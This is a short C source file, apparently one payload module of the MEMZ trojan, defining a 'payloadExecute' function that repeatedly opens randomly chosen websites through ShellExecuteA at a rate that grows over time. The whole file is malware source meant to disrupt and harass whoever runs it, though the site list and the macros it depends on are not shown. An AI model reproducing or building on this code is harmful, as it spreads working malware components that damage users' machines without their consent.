#include "../MEMZ.h"

PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}